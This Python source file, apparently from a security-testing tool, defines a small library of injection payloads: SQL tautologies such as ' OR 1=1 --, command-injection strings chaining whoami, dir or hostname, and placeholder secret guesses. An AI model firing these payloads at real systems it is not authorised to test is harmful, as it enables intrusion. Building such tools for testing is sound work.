from __future__ import annotations

class AttackLibrary:
    def __init__(self) -> None:
        self._payloads = {
            "SQL Injection": [
                "' OR '1'='2",
                "admin' --",
                "' OR '1'='1' -- ",
                "1' OR 1=1 --",
                "' OR 1=1/*"
            ],
            "Hardcoded Secret": [
                "INCORRECT_KEY",
                "GENERIC_TOKEN",
                "{winning_payload}"
            ],
            "Command Injection": [
                "; whoami",
                "&& whoami",
                "; dir",
                "&& dir",
                "| whoami",
                "| dir",
                "& whoami",
                "& dir",
                "; hostname",
                "&& hostname",
                "; echo YATA_SUCCESS",
                "&& echo YATA_SUCCESS"
            ]
        }

    def get_payloads(self, vulnerability_type: str, winning_payload: str) -> list[str]:
        raw_payloads = self._payloads.get(vulnerability_type, [])
        processed = []
        for p in raw_payloads:
            if p == "{winning_payload}":
                processed.append(winning_payload)
            else:
                processed.append(p)
        if not processed and winning_payload:
            processed = [winning_payload]
        return processed
